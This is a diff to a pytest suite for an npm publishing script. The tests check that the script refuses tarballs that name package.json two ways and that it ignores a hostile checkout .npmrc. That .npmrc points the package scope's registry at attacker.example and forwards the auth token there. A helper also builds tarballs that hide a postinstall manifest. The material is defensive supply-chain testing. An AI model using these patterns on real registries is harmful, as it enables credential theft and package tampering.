@@ -31,10 +31,15 @@ TOKEN = "tok-secret-value"
 REAL_NPM = shutil.which("npm")
 
 STUB = """#!/bin/sh
+# npm gets a minimal environment, so the stub's settings live in a file beside it.
+. "$(dirname "$0")/stub.conf"
 cmd="$1"
 if [ "$cmd" = pack ]; then exec "$REAL_NPM" "$@"; fi
 {
   echo "cmd: $*"
+  echo "cwd: $(pwd)"
+  echo "home: $HOME"
+  echo "env-names: $(env | cut -d= -f1 | sort | tr '\\n' ' ')"
   echo "token: $CODEARTIFACT_AUTH_TOKEN"
   rc=""
   for a in "$@"; do [ "$prev" = "--userconfig" ] && rc="$a"; prev="$a"; done
@@ -60,6 +65,22 @@ def needs_npm() -> None:
         pytest.skip("npm is not installed")
 
 
+STUB_KEYS = {"log": "STUB_LOG", "view": "STUB_VIEW", "exit": "STUB_EXIT"}
+
+
+def stub_conf(bindir: Path, **values: object) -> None:
+    """(Re)write the stub's settings; a key not passed keeps its earlier value."""
+    path = bindir / "stub.conf"
+    current: dict[str, str] = {"STUB_EXIT": "0", "REAL_NPM": str(REAL_NPM)}
+    if path.exists():
+        for line in path.read_text().splitlines():
+            key, _, value = line.partition("=")
+            current[key] = value.strip("'")
+    for key, value in values.items():
+        current[STUB_KEYS[key]] = str(value)
+    path.write_text("".join(f"{k}='{v}'\n" for k, v in current.items()))
+
+
 @pytest.fixture
 def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Path]:
     bindir = tmp_path / "bin"
@@ -71,13 +92,17 @@ def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Path]:
     work.mkdir()
     temp = tmp_path / "temp"
     temp.mkdir()
-    monkeypatch.setenv("REAL_NPM", str(REAL_NPM))
     monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
-    monkeypatch.setenv("STUB_LOG", str(tmp_path / "log.txt"))
-    monkeypatch.setenv("STUB_VIEW", "404")
+    stub_conf(bindir, log=tmp_path / "log.txt", view="404")
     monkeypatch.setenv(pn.TOKEN_VAR, TOKEN)
     monkeypatch.chdir(work)
-    return {"work": work, "temp": temp, "log": tmp_path / "log.txt", "out": work / "packed"}
+    return {
+        "work": work,
+        "temp": temp,
+        "log": tmp_path / "log.txt",
+        "out": work / "packed",
+        "bin": bindir,
+    }
 
 
 def package(work: Path, content: str = "one", **over: object) -> Path:
@@ -112,6 +137,13 @@ def prepare(
 def tarball(env: dict[str, Path]) -> Path:
     (found,) = env["out"].glob("*.tgz")
     return found
+
+
+def canonical_integrity(env: dict[str, Path], tgz: Path) -> str:
+    """The integrity `publish` computes: of the tarball rebuilt from the members it checked."""
+    rebuilt = env["temp"].parent / "rebuilt.tgz"
+    pn.write_canonical(pn.read_members(tgz), rebuilt)
+    return pn.integrity_of(rebuilt)
 
 
 def publish(env: dict[str, Path], tgz: Path, endpoint: str = ENDPOINT) -> int:
@@ -154,6 +186,11 @@ def test_prepare_runs_the_packages_prepack(env):
         ({"name": "contract"}, "1.0.0", "not scoped"),
         ({"private": True}, "1.0.0", "private"),
         ({"publishConfig": {"registry": "https://registry.npmjs.org/"}}, "1.0.0", "publishConfig"),
+        (
+            {"publishConfig": {"@emergentmatter:registry": "https://x.example/"}},
+            "1.0.0",
+            "registry",
+        ),
         ({"scripts": {"postinstall": "node x.js"}}, "1.0.0", "install-time"),
         ({"scripts": {"prepare": "x"}}, "1.0.0", "install-time"),
         ({}, "1.0.0-rc.1", "MAJOR.MINOR.PATCH"),
@@ -239,7 +276,11 @@ def test_publish_uses_a_scope_only_npmrc_and_the_token_only_through_the_environm
     tgz = packed(env)
     assert publish(env, tgz) == 0
     log = env["log"].read_text()
-    assert "cmd: publish " in log and f"--registry {ENDPOINT}" in log and str(tgz.resolve()) in log
+    assert (
+        "cmd: publish " in log
+        and f"--registry {ENDPOINT}" in log
+        and "publish ./publish.tgz" in log
+    )
     assert "npmrc-mode: 600" in log
     npmrc = log.split("---npmrc\n")[1].split("cmd:")[0]
     assert npmrc == (
@@ -256,14 +297,14 @@ def test_publish_uses_a_scope_only_npmrc_and_the_token_only_through_the_environm
 
 def test_publish_skips_a_version_already_there_with_the_same_content(env, monkeypatch):
     tgz = packed(env)
-    monkeypatch.setenv("STUB_VIEW", pn.integrity_of(tgz))
+    stub_conf(env["bin"], view=canonical_integrity(env, tgz))
     assert publish(env, tgz) == 0
     assert "cmd: publish" not in env["log"].read_text()
 
 
 def test_publish_fails_for_the_same_version_with_different_content(env, monkeypatch, capsys):
     tgz = packed(env)
-    monkeypatch.setenv("STUB_VIEW", "sha512-AAAA")
+    stub_conf(env["bin"], view="sha512-AAAA")
     assert publish(env, tgz) == 1
     assert "already exists with different content" in capsys.readouterr().err
     assert "cmd: publish" not in env["log"].read_text()
@@ -271,7 +312,7 @@ def test_publish_fails_for_the_same_version_with_different_content(env, monkeypa
 
 def test_publish_fails_when_it_cannot_ask_the_registry(env, monkeypatch, capsys):
     tgz = packed(env)
-    monkeypatch.setenv("STUB_VIEW", "net")
+    stub_conf(env["bin"], view="net")
     assert publish(env, tgz) == 1
     assert "could not ask the registry" in capsys.readouterr().err
     assert "cmd: publish" not in env["log"].read_text()
@@ -279,7 +320,7 @@ def test_publish_fails_when_it_cannot_ask_the_registry(env, monkeypatch, capsys)
 
 def test_a_failed_npm_publish_fails_the_run_and_still_cleans_up(env, monkeypatch, capsys):
     tgz = packed(env)
-    monkeypatch.setenv("STUB_EXIT", "1")
+    stub_conf(env["bin"], exit="1")
     assert publish(env, tgz) == 1
     assert "npm publish failed" in capsys.readouterr().err
     assert list(env["temp"].iterdir()) == []
@@ -519,3 +560,178 @@ def test_a_caller_built_tarball_is_verified_never_built_by_the_publish_job(path)
     for forbidden in ("npm ci", "npm install", "bun install", "bun run", "npm run"):
         assert forbidden not in publish, forbidden
     assert "npm-tarballs-artifact needs npm-packages" in publish
+
+
+# --------------------------------------------------- one manifest: normalised names
+
+
+def hand_made(dest: Path, names: list[str], manifests: list[str], name: str = "x.tgz") -> Path:
+    """A tarball whose members are exactly `names`, each holding the matching manifest text."""
+    return raw_tarball(dest, dict(zip(names, manifests, strict=True)), name)
+
+
+BENIGN = manifest_text()
+REAL = manifest_text(version="99.0.0", scripts={"postinstall": "node dist/index.js"})
+DATA = "{}"
+
+# Each is a tarball in which npm and a reader that keys on the written name disagree about
+# which package.json is the manifest. The first manifest is benign, the last is the one npm uses.
+TWO_MANIFESTS = {
+    "dotslash": ["package/package.json", "package/data.json", "package/./package.json"],
+    "doubleslash": ["package/package.json", "package/data.json", "package//package.json"],
+    "backslash": ["package/package.json", "package/data.json", "package\\package.json"],
+    "trailing-slash": ["package/package.json", "package/data.json", "package/package.json/"],
+    "duplicate": ["package/package.json", "package/data.json", "package/package.json"],
+    "dotdot-roundtrip": ["package/package.json", "package/data.json", "package/x/../package.json"],
+}
+
+
+def duplicate_safe(names: list[str]) -> dict[str, str]:
+    """`raw_tarball` takes a dict, so repeated names need distinct keys that tar writes alike."""
+    return {
+        name: BENIGN if i == 0 else (REAL if i == len(names) - 1 else DATA)
+        for i, name in enumerate(names)
+    }
+
+
+def write_attack(dest: Path, names: list[str]) -> Path:
+    import io
+    import tarfile
+
+    dest.mkdir(parents=True, exist_ok=True)
+    path = dest / "x.tgz"
+    texts = duplicate_safe(names)
+    with tarfile.open(path, "w:gz") as archive:
+        for i, name in enumerate(names):
+            text = BENIGN if i == 0 else (REAL if i == len(names) - 1 else DATA)
+            data = text.encode()
+            info = tarfile.TarInfo(name)
+            info.size = len(data)
+            archive.addfile(info, io.BytesIO(data))
+    assert texts  # keep the helper's contract visible
+    return path
+
+
+@pytest.mark.parametrize("shape", sorted(TWO_MANIFESTS))
+def test_verify_refuses_a_tarball_with_two_ways_to_name_the_manifest(env, capsys, shape):
+    package(env["work"])
+    artifacts = env["work"] / "built"
+    write_attack(artifacts, TWO_MANIFESTS[shape])
+    assert run_verify(env, artifacts) == 1
+    err = capsys.readouterr().err
+    assert "not a normal path" in err or "more than once" in err
+    assert not list(env["out"].glob("*.tgz")) if env["out"].exists() else True
+
+
+@pytest.mark.parametrize("shape", sorted(TWO_MANIFESTS))
+def test_publish_refuses_the_same_tarballs_without_verify(env, shape):
+    package(env["work"])
+    tgz = write_attack(env["work"] / "built", TWO_MANIFESTS[shape])
+    assert publish(env, tgz) == 1
+    assert not env["log"].exists()
+
+
+def test_verify_publishes_a_canonical_tarball_rebuilt_from_what_it_checked(env):
+    artifacts = built(env)
+    assert run_verify(env, artifacts) == 0
+    (first,) = env["out"].glob("*.tgz")
+    assert first.name == "emergentmatter-contract-1.4.0.tgz"
+    import tarfile
+
+    with tarfile.open(first) as archive:
+        members = archive.getmembers()
+    assert [m.name for m in members] == ["package/data.json", "package/package.json"]
+    assert {(m.uid, m.gid, m.mtime) for m in members} == {(0, 0, 0)}
+    assert all(m.isfile() for m in members)
+    # The same members give the same bytes, so a re-run's integrity matches the first run's.
+    again = env["work"] / "again"
+    pn.write_canonical(
+        pn.read_members(artifacts / next(artifacts.glob("*.tgz")).name), again.with_suffix(".tgz")
+    )
+    assert again.with_suffix(".tgz").read_bytes() == first.read_bytes()
+
+
+def test_the_published_tarball_is_the_one_that_was_checked(env):
+    """npm and the checker see one manifest: the verified version, not another."""
+    artifacts = built(env)
+    assert run_verify(env, artifacts) == 0
+    (out,) = env["out"].glob("*.tgz")
+    extracted = env["work"] / "extracted"
+    extracted.mkdir()
+    subprocess.run(["tar", "xzf", str(out), "-C", str(extracted)], check=True)
+    assert json.loads((extracted / "package" / "package.json").read_text())["version"] == "1.4.0"
+
+
+# ------------------------------------------- npm runs where no checkout config can reach it
+
+
+HOSTILE = (
+    "@emergentmatter:registry=https://attacker.example/x/\n"
+    "//attacker.example/x/:_authToken=${CODEARTIFACT_AUTH_TOKEN}\n"
+)
+
+
+def npm_config_get(key: str, cwd: Path, args: list[str], environment: dict[str, str]) -> str:
+    result = subprocess.run(
+        [REAL_NPM, "config", "get", key, *args],
+        cwd=cwd,
+        env=environment,
+        capture_output=True,
+        text=True,
+        check=True,
+    )
+    return result.stdout.strip()
+
+
+def test_a_hostile_npmrc_in_the_checkout_is_never_read(env, tmp_path, monkeypatch):
+    checkout = env["work"]
+    (checkout / ".npmrc").write_text(HOSTILE)
+    (checkout / "package.json").write_text("{}")
+    inside = checkout / "tmp"  # a temp dir under the checkout would walk up into the hostile file
+    inside.mkdir()
+    workdir = Path(__import__("tempfile").mkdtemp(prefix="em-npm-", dir=inside))
+    (workdir / "npmrc").write_text(pn.npmrc_text("@emergentmatter", ENDPOINT))
+    config = pn.npm_config(workdir, ENDPOINT)
+    environment = pn.npm_environment(workdir)
+
+    # The control: npm as the old code ran it, in the checkout, does read the hostile file.
+    old_args = ["--userconfig", str(workdir / "npmrc"), "--registry", ENDPOINT]
+    old_env = {**os.environ, "HOME": str(tmp_path)}
+    assert "attacker.example" in npm_config_get(
+        "@emergentmatter:registry", checkout, old_args, old_env
+    )
+
+    # As publish runs it, the registry is ours and the attacker's host has no credential.
+    registry = npm_config_get("@emergentmatter:registry", workdir, config, environment)
+    assert registry == ENDPOINT
+    listing = subprocess.run(
+        [REAL_NPM, "config", "list", *config],
+        cwd=workdir,
+        env=environment,
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert "attacker.example" not in listing.stdout + listing.stderr
+
+
+def test_npm_sees_a_minimal_environment_in_a_directory_that_is_not_the_checkout(env, monkeypatch):
+    for name in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "GITHUB_TOKEN"):
+        monkeypatch.setenv(name, "must-not-reach-npm")
+    (env["work"] / ".npmrc").write_text(HOSTILE)
+    tgz = packed(env)
+    assert publish(env, tgz) == 0
+    log = env["log"].read_text()
+    cwds = {line.split(": ", 1)[1] for line in log.splitlines() if line.startswith("cwd: ")}
+    homes = {line.split(": ", 1)[1] for line in log.splitlines() if line.startswith("home: ")}
+    assert len(cwds) == 1 and cwds == homes
+    (cwd,) = cwds
+    assert Path(cwd).parent.resolve() == env["temp"].resolve()
+    assert env["work"].resolve() not in [Path(cwd).resolve(), *Path(cwd).resolve().parents]
+    names = {
+        n for line in log.splitlines() if line.startswith("env-names: ") for n in line.split()[1:]
+    }
+    assert {"PATH", "HOME", pn.TOKEN_VAR} <= names
+    assert names <= {"PATH", "HOME", pn.TOKEN_VAR, "PWD", "SHLVL", "_", "OLDPWD"}, names
+    assert "must-not-reach-npm" not in log
+    assert "--globalconfig" in log and "--prefix" in log
